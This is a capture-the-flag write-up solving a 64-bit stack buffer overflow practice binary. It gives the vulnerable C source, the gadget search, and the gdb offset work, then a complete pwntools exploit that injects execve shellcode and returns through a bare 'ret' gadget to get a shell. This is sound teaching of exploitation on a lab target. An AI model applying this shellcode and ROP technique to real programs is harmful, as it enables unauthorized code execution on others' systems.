Let's see if this file has any binary hardening systems in place using pwntools.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8_64$ pwn checksec b8_64
[*] '/Hackery/escape/buf_ovf/b8_64/b8_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

So that would be a no. Let's check out the code...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8$ cat b8.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void the_horror()
{
	unsigned int ret_adr;
	char buf0[40];
	fgets(buf0, 100, stdin);
	ret_adr = __builtin_return_address(0);

	if ((ret_adr & 0xf0000000) == 0xf0000000)
	{
		printf("Don't you have anything better to do? Clearly not.\n");
		exit(0);
	}
	printf("That's it, if you don't get back to your work at %p, we will have to deploy the mechs.\n", ret_adr);
}

int main()
{
	printf("Corrective solutions aren't working. We might have to upgrade.\n");
	the_horror();
}
```

First off we see that it is pretty similar to the previous challenge, as it implements the same check as the previous problem. So we won't be able to directly hit the rip register with an address that could store our input, or from libc. However it does not have the strdup() call the previous one had, so we will not be able to simply call the eax register. However we can still push shellcode to the stack, and execute it if we find a way. We will have to implement a ROP (return oriented programming) exploit in order to execute shellcode that we push onto the stack. Thing is the check it does only checks the value of the eip register, not what's before after or anything else. If we were to push a ROP gadget to the eip register that ended with a "ret" instruction, the parameter for the return instruction will be the address directly after it since stacks grow towards lower addresses and our overflow works towards higher addresses. As a result the "ret" instruction will have the program jump to whatever instruction is placed immediatley after it. So we can just push shellcode to the program, hit the rip register to have a ROP gadget address that just has the "ret" instruction, store the address of our input that has the shellcode immediately after it, and we should have a shell. One thing I would like to mention, typically with ROP before you return you will need to clean the stack by having the gadget use several "pop" instructions to clear the stack for the new code to execute properly. Here the shellcode will take care of it so we don't have to worry about it (you will in future challenges). Now let's find our ROP Gadget.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8_64$ ROPgadget --binary b8_64 | grep ret
0x00000000004006ff : add bl, dh ; ret
0x00000000004006fd : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040056c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040048b : add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000040056e : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006fe : add byte ptr [rax], al ; ret
0x00000000004005d8 : add byte ptr [rcx], al ; ret
0x00000000004005d4 : add eax, 0x2005ae ; add ebx, esi ; ret
0x00000000004005d6 : add eax, 0xf3010020 ; ret
0x00000000004005d9 : add ebx, esi ; ret
0x000000000040048e : add esp, 8 ; ret
0x000000000040048d : add rsp, 8 ; ret
0x00000000004005d7 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004006dc : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400489 : jae 0x400493 ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x0000000000400665 : leave ; ret
0x00000000004005d3 : mov byte ptr [rip + 0x2005ae], 1 ; ret
0x000000000040067f : mov eax, 0 ; pop rbp ; ret
0x0000000000400664 : nop ; leave ; ret
0x0000000000400568 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004006f8 : nop dword ptr [rax + rax] ; ret
0x00000000004005b5 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004006ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006f0 : pop r14 ; pop r15 ; ret
0x00000000004006f2 : pop r15 ; ret
0x00000000004005d2 : pop rbp ; mov byte ptr [rip + 0x2005ae], 1 ; ret
0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ef : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400570 : pop rbp ; ret
0x00000000004006f3 : pop rdi ; ret
0x00000000004006f1 : pop rsi ; pop r15 ; ret
0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400491 : ret
0x00000000004005d5 : scasb al, byte ptr [rdi] ; add eax, 0xf3010020 ; ret
0x0000000000400705 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000400704 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040056a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
```

So looking through this list, we see the gadget we want.

```
0x0000000000400491 : ret
```

So we will replace the address stored in the rip register with 0x0000000000400491. Now to find the offset.

```
gdb-peda$ disas the_horror
Dump of assembler code for function the_horror:
   0x0000000000400606 <+0>: push   rbp
   0x0000000000400607 <+1>: mov    rbp,rsp
   0x000000000040060a <+4>: sub    rsp,0x30
   0x000000000040060e <+8>: mov    rdx,QWORD PTR [rip+0x20056b]        # 0x600b80 <stdin@@GLIBC_2.2.5>
   0x0000000000400615 <+15>:  lea    rax,[rbp-0x30]
   0x0000000000400619 <+19>:  mov    esi,0x64
   0x000000000040061e <+24>:  mov    rdi,rax
   0x0000000000400621 <+27>:  call   0x4004e0 <fgets@plt>
   0x0000000000400626 <+32>:  mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040062a <+36>:  mov    DWORD PTR [rbp-0x4],eax
   0x000000000040062d <+39>:  mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400630 <+42>:  and    eax,0xf0000000
   0x0000000000400635 <+47>:  cmp    eax,0xf0000000
   0x000000000040063a <+52>:  jne    0x400650 <the_horror+74>
   0x000000000040063c <+54>:  mov    edi,0x400718
   0x0000000000400641 <+59>:  call   0x4004b0 <puts@plt>
   0x0000000000400646 <+64>:  mov    edi,0x0
   0x000000000040064b <+69>:  call   0x4004f0 <exit@plt>
   0x0000000000400650 <+74>:  mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400653 <+77>:  mov    esi,eax
   0x0000000000400655 <+79>:  mov    edi,0x400750
   0x000000000040065a <+84>:  mov    eax,0x0
   0x000000000040065f <+89>:  call   0x4004c0 <printf@plt>
   0x0000000000400664 <+94>:  nop
   0x0000000000400665 <+95>:  leave  
   0x0000000000400666 <+96>:  ret    
End of assembler dump.
gdb-peda$ b *the_horror+32
Breakpoint 1 at 0x400626
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b8_64/b8_64 
Corrective solutions aren't working. We might have to upgrade.
75395128
```

One wall of text later...

```
Breakpoint 1, 0x0000000000400626 in the_horror ()
gdb-peda$ x/s $rbp-0x30
0x7fffffffde20: "75395128\n"
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde60:
 rip = 0x400626 in the_horror; saved rip = 0x40067f
 called by frame at 0x7fffffffde70
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
```

And now to fight some bunny...

```
>>> 0x7fffffffde58 - 0x7fffffffde20
56
>>> 56 - 27
29
```

So we will be using the same shellcode from b5_64, so we will only need 29 characters worth of padding (since the shellcode takes up 27). We also have the relative location of the input (which if you were to run the exploit in gdb with that address it would work just fine). Here are the address I tried before I reached the correct address.

```
0x7fffffffde20
0x7fffffffde30
0x7fffffffde40
0x7fffffffde50
```

With all of the information we have collected, I present my exploit.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8_64$ cat exploit.py 
#Import pwntools
from pwn import *

#Start the target Process
target = process("./b8_64")

#Read first line of text
print target.recvline()

#Store shellcode in variab;e
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#Construct padding
offset = "1"*29

#Declare ROP gadget
ROP = p64(0x0000000000400491)

#Declare address of our shellcode
adr = p64(0x7fffffffde50)

#Construct the payload
payload = shellcode + offset + ROP + adr

#Write the payload to a file for gdb purposes
p = open("in", "w")
p.write(payload)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

Let's test it out...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b8_64$ python exploit.py 
[+] Starting local process './b8_64': Done
Corrective solutions aren't working. We might have to upgrade.

[*] Switching to interactive mode
That's it, if you don't get back to your work at 0x400491, we will have to deploy the mechs.
$ ls
b8_64     core         in   peda-session-b8_64.txt
b8_64.c  exploit.py  out  peda-session-dash.txt
$ cat out
That's it, bring out the mechs. Just remember, you asked for this. Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b8_64' stopped with exit code 0
[*] Got EOF while sending in interactive
```

Just like that, we pwned the binary. 

